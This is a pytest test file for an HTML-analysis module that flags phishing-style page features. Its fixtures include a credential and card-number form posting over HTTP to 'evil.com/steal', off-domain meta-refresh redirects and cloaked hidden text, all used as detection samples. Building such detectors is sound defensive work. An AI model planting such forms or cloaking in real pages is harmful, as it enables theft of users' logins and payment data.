"""
Unit tests for src/analysis/web_code.py

Run from the project root:

    pytest tests/test_web_code.py

Imported as `analysis.web_code`, so these rely on `pythonpath = src`
(see pytest.ini). No network beyond tldextract's public-suffix list, which
get_domain uses (it fetches once or falls back to a bundled snapshot). All
hosts here are unambiguous .com/.co.uk/.net so registrable-domain results are
stable either way.

Every test parses a small HTML fragment or document and calls the extractor
directly with (soup, base_url, home_domain). Nothing here touches HTTP.
"""
import json

from bs4 import BeautifulSoup

from analysis.web_code import (
    build_web_code_report,
    classify_links,
    detect_hidden_elements,
    extract_css,
    extract_dom_skeleton,
    extract_forms,
    extract_metadata,
    extract_resource_references,
    report_from_html,
)


def _soup(html: str) -> BeautifulSoup:
    return BeautifulSoup(html, "html.parser")


BASE = "https://example.com/login"
HOME = "example.com"


# ---------------------------------------------------------------------------
# extract_dom_skeleton
# ---------------------------------------------------------------------------
class TestExtractDomSkeleton:
    def test_counts_tags_and_elements(self):
        skel = extract_dom_skeleton(_soup("<html><body><div><p>hi</p></div></body></html>"))
        assert skel.element_count == 4
        assert skel.tag_counts == {"html": 1, "body": 1, "div": 1, "p": 1}

    def test_repeated_tags_counted(self):
        skel = extract_dom_skeleton(_soup("<div><p>a</p><p>b</p><p>c</p></div>"))
        assert skel.tag_counts["p"] == 3

    def test_max_depth_of_full_document(self):
        # html(1) > body(2) > div(3) > p(4)
        skel = extract_dom_skeleton(_soup("<html><body><div><p>x</p></div></body></html>"))
        assert skel.max_depth == 4

    def test_outline_lists_nested_tags(self):
        skel = extract_dom_skeleton(_soup("<html><body><div><p>x</p></div></body></html>"))
        for tag in ("body", "div", "p"):
            assert tag in skel.outline

    def test_outline_truncates_wide_sibling_lists(self):
        spans = "".join(f"<span>{i}</span>" for i in range(12))
        skel = extract_dom_skeleton(_soup(f"<html><body>{spans}</body></html>"))
        assert skel.tag_counts["span"] == 12
        assert "... (+2 more)" in skel.outline


# ---------------------------------------------------------------------------
# extract_forms
# ---------------------------------------------------------------------------
class TestExtractForms:
    def test_off_domain_insecure_credential_form(self):
        html = (
            '<form action="http://evil.com/steal" method="POST">'
            '<input type="email" name="email">'
            '<input type="password" name="pass">'
            '<input type="text" name="cardNumber" autocomplete="cc-number">'
            '<input type="hidden" name="t">'
            "</form>"
        )
        form = extract_forms(_soup(html), BASE, HOME)[0]
        assert form.action == "http://evil.com/steal"
        assert form.action_url == "http://evil.com/steal"
        assert form.action_domain == "evil.com"
        assert form.action_off_domain is True
        assert form.action_insecure is True
        assert form.method == "post"
        assert form.input_count == 4
        assert form.hidden_input_count == 1
        assert form.field_type_counts == {"email": 1, "password": 1, "text": 1, "hidden": 1}
        assert form.has_password_field is True
        assert form.has_email_field is True
        assert form.has_payment_field is True

    def test_same_domain_relative_secure_form(self):
        html = '<form action="/submit"><input type="text" name="q"></form>'
        form = extract_forms(_soup(html), "https://example.com/page", HOME)[0]
        assert form.action_url == "https://example.com/submit"
        assert form.action_domain == "example.com"
        assert form.action_off_domain is False
        assert form.action_insecure is False
        assert form.method == ""
        assert form.has_password_field is False
        assert form.has_email_field is False
        assert form.has_payment_field is False

    def test_empty_action_defaults_to_page_url(self):
        form = extract_forms(_soup("<form></form>"), BASE, HOME)[0]
        assert form.action == ""
        assert form.action_url == BASE
        assert form.action_off_domain is False
        assert form.input_count == 0
        assert form.fields == []

    def test_select_and_textarea_are_counted(self):
        html = '<form><select name="s"></select><textarea name="t"></textarea></form>'
        form = extract_forms(_soup(html), BASE, HOME)[0]
        assert form.input_count == 2
        assert form.field_type_counts == {"select": 1, "textarea": 1}

    def test_email_detected_by_field_name(self):
        html = '<form><input type="text" name="user_email"></form>'
        form = extract_forms(_soup(html), BASE, HOME)[0]
        assert form.has_email_field is True

    def test_payment_detected_by_field_name(self):
        html = '<form><input name="cvv"></form>'
        form = extract_forms(_soup(html), BASE, HOME)[0]
        assert form.has_payment_field is True

    def test_no_forms_returns_empty_list(self):
        assert extract_forms(_soup("<div>no forms</div>"), BASE, HOME) == []


# ---------------------------------------------------------------------------
# extract_css
# ---------------------------------------------------------------------------
class TestExtractCss:
    HTML = (
        "<style>.a{display:none}.b{visibility:hidden}</style>"
        '<link rel="stylesheet" href="/local.css">'
        '<link rel="stylesheet" href="https://cdn.other.com/x.css">'
        '<link rel="icon" href="/f.ico">'
        '<div style="color:red"></div><span style="opacity:0"></span>'
    )

    def test_counts_inline_styles_and_blocks(self):
        css = extract_css(_soup(self.HTML), "https://example.com/", HOME)
        assert css.inline_style_count == 2
        assert css.style_block_count == 1
        assert "display:none" in css.style_blocks[0]

    def test_stylesheets_classified_by_origin(self):
        css = extract_css(_soup(self.HTML), "https://example.com/", HOME)
        assert len(css.stylesheets) == 2  # the rel="icon" link is excluded
        by_domain = {s.domain: s for s in css.stylesheets}
        assert by_domain["example.com"].off_domain is False
        assert by_domain["other.com"].off_domain is True
        assert css.third_party_stylesheet_count == 1

    def test_counts_hiding_declarations_in_style_blocks(self):
        css = extract_css(_soup(self.HTML), "https://example.com/", HOME)
        assert css.suspicious_declaration_count == 2


# ---------------------------------------------------------------------------
# detect_hidden_elements
# ---------------------------------------------------------------------------
class TestDetectHiddenElements:
    HTML = (
        '<div style="display:none">secret one</div>'
        '<p style="visibility:hidden">secret two</p>'
        '<span style="opacity:0">three</span>'
        '<div style="position:absolute;left:-9999px">offscreen kw</div>'
        "<div hidden>attr hidden</div>"
        '<div aria-hidden="true">aria</div>'
        '<input type="hidden" name="tok">'
        '<div style="color:blue">visible</div>'
    )

    def test_finds_each_hiding_technique(self):
        hits = detect_hidden_elements(_soup(self.HTML))
        techniques = sorted(h.technique for h in hits)
        assert techniques == sorted(
            [
                "display:none",
                "visibility:hidden",
                "opacity:0",
                "offscreen",
                "hidden-attr",
                "aria-hidden",
            ]
        )

    def test_ignores_hidden_inputs_and_visible_styled_elements(self):
        hits = detect_hidden_elements(_soup(self.HTML))
        # 6 real hits; the type="hidden" input and the color:blue div are excluded.
        assert len(hits) == 6

    def test_captures_cloaked_text_preview(self):
        hits = detect_hidden_elements(_soup(self.HTML))
        assert any(
            h.technique == "offscreen" and "offscreen kw" in h.text_preview for h in hits
        )

    def test_empty_when_nothing_hidden(self):
        assert detect_hidden_elements(_soup("<div>plain</div><p>text</p>")) == []


# ---------------------------------------------------------------------------
# extract_metadata
# ---------------------------------------------------------------------------
class TestExtractMetadata:
    HTML = (
        '<html lang="en"><head>'
        "<title>  My Title </title>"
        '<meta name="description" content="desc here">'
        '<meta name="keywords" content="a,b">'
        '<meta name="generator" content="WordPress">'
        '<meta charset="utf-8">'
        '<meta property="og:site_name" content="BrandX">'
        '<meta property="og:title" content="OG Title">'
        '<meta http-equiv="refresh" content="5; url=https://evil.com/next">'
        '<link rel="canonical" href="https://example.com/canon">'
        '<link rel="icon" href="/fav.ico">'
        "</head><body></body></html>"
    )

    def test_basic_fields(self):
        meta = extract_metadata(_soup(self.HTML), "https://example.com/page")
        assert meta.title == "My Title"
        assert meta.description == "desc here"
        assert meta.keywords == "a,b"
        assert meta.lang == "en"
        assert meta.charset == "utf-8"
        assert meta.generator == "WordPress"

    def test_resolves_favicon_and_canonical(self):
        meta = extract_metadata(_soup(self.HTML), "https://example.com/page")
        assert meta.favicon == "https://example.com/fav.ico"
        assert meta.canonical == "https://example.com/canon"

    def test_open_graph_tags(self):
        meta = extract_metadata(_soup(self.HTML), "https://example.com/page")
        assert meta.og == {"og:site_name": "BrandX", "og:title": "OG Title"}

    def test_parses_meta_refresh(self):
        meta = extract_metadata(_soup(self.HTML), "https://example.com/page")
        assert meta.meta_refresh == {"delay": "5", "url": "https://evil.com/next"}

    def test_no_meta_refresh_is_none(self):
        meta = extract_metadata(_soup("<html><head><title>t</title></head></html>"),
                                "https://example.com/")
        assert meta.meta_refresh is None


# ---------------------------------------------------------------------------
# extract_resource_references
# ---------------------------------------------------------------------------
class TestExtractResourceReferences:
    HTML = (
        '<img src="/img/a.png">'
        '<img src="https://cdn.other.com/b.png">'
        '<iframe src="https://ads.evil.com/frame"></iframe>'
        '<object data="https://obj.other.com/o.swf"></object>'
        '<embed src="/e.swf">'
        '<video src="/v.mp4"></video>'
        '<source src="https://media.other.com/s.mp4">'
        '<link rel="preload" href="https://pre.other.com/p.js">'
        '<link rel="stylesheet" href="/s.css">'
        '<script src="/x.js"></script>'
    )

    def test_counts_by_kind(self):
        inv = extract_resource_references(_soup(self.HTML), "https://example.com/", HOME)
        assert inv.counts["image"] == 2
        assert inv.counts["iframe"] == 1
        assert inv.counts["object"] == 1
        assert inv.counts["embed"] == 1
        assert inv.counts["media"] == 2  # source + video
        assert inv.counts["preload"] == 1
        assert len(inv.resources) == 8

    def test_third_party_domains_collected(self):
        inv = extract_resource_references(_soup(self.HTML), "https://example.com/", HOME)
        assert inv.third_party_domains == ["evil.com", "other.com"]

    def test_stylesheets_and_scripts_excluded(self):
        inv = extract_resource_references(_soup(self.HTML), "https://example.com/", HOME)
        urls = [r.url for r in inv.resources]
        assert not any("s.css" in u for u in urls)
        assert not any("x.js" in u for u in urls)

    def test_off_domain_flag_on_iframe(self):
        inv = extract_resource_references(_soup(self.HTML), "https://example.com/", HOME)
        iframe = next(r for r in inv.resources if r.kind == "iframe")
        assert iframe.domain == "evil.com"
        assert iframe.off_domain is True


# ---------------------------------------------------------------------------
# classify_links
# ---------------------------------------------------------------------------
class TestClassifyLinks:
    HTML = (
        '<a href="/home">home</a>'
        '<a href="about">about</a>'
        '<a href="https://sub.example.com/x">same-registrable</a>'
        '<a href="https://evil.com/a">ext1</a>'
        '<a href="https://evil.com/b">ext2</a>'
        '<a href="https://other.com/c">ext3</a>'
        '<a href="mailto:a@b.com?subject=hi">mail</a>'
        '<a href="tel:+1555">tel</a>'
        '<a href="#top">frag</a>'
        '<a href="javascript:void(0)">js</a>'
    )

    def test_bucket_counts(self):
        links = classify_links(_soup(self.HTML), "https://example.com/page", HOME)
        assert links.counts == {
            "internal": 3,   # /home, about, sub.example.com (same registrable domain)
            "external": 3,   # evil.com x2, other.com
            "mailto": 1,
            "tel": 1,
            "other": 2,      # fragment + javascript:
            "total": 10,
        }

    def test_external_domains_deduplicated(self):
        links = classify_links(_soup(self.HTML), "https://example.com/page", HOME)
        assert links.external_domains == ["evil.com", "other.com"]

    def test_outbound_ratio(self):
        links = classify_links(_soup(self.HTML), "https://example.com/page", HOME)
        assert links.outbound_ratio == 0.5  # 3 external / (3 internal + 3 external)

    def test_mailto_and_tel_extracted(self):
        links = classify_links(_soup(self.HTML), "https://example.com/page", HOME)
        assert links.mailto == ["a@b.com"]
        assert links.tel == ["+1555"]


# ---------------------------------------------------------------------------
# build_web_code_report / report_from_html
# ---------------------------------------------------------------------------
class TestBuildReport:
    HTML = (
        '<html lang="en"><head>'
        "<title>Login</title>"
        '<meta http-equiv="refresh" content="3; url=https://evil.com/go">'
        '<link rel="stylesheet" href="https://cdn.other.com/s.css">'
        "</head><body>"
        '<div style="display:none">hidden</div>'
        '<form action="http://evil.com/steal" method="post">'
        '<input type="password" name="pass">'
        '<input name="cardnumber" autocomplete="cc-number">'
        "</form>"
        '<iframe src="https://ads.other.com/f"></iframe>'
        '<a href="/a">in</a>'
        '<a href="https://evil.com/x">out</a>'
        "</body></html>"
    )

    def _report(self):
        return report_from_html(self.HTML, "https://example.com/login", "example.com")

    def test_feature_flags(self):
        f = self._report().features
        assert f["form_count"] == 1
        assert f["has_password_form"] is True
        assert f["has_payment_form"] is True
        assert f["has_off_domain_form_action"] is True
        assert f["has_insecure_form_action"] is True
        assert f["has_meta_refresh"] is True
        assert f["meta_refresh_off_domain"] is True
        assert f["iframe_count"] == 1
        assert f["third_party_iframe_count"] == 1
        assert f["hidden_element_count"] == 1
        assert f["third_party_stylesheet_count"] == 1
        assert f["external_link_count"] == 1

    def test_report_identity(self):
        report = self._report()
        assert report.url == "https://example.com/login"
        assert report.home_domain == "example.com"

    def test_report_is_json_serializable(self):
        report = self._report()
        dumped = json.dumps(report.to_dict())
        assert '"features"' in dumped

    def test_build_from_shared_soup_matches_wrapper(self):
        # build_web_code_report on a shared soup should match report_from_html.
        soup = _soup(self.HTML)
        direct = build_web_code_report(soup, "https://example.com/login", "example.com")
        assert direct.features == self._report().features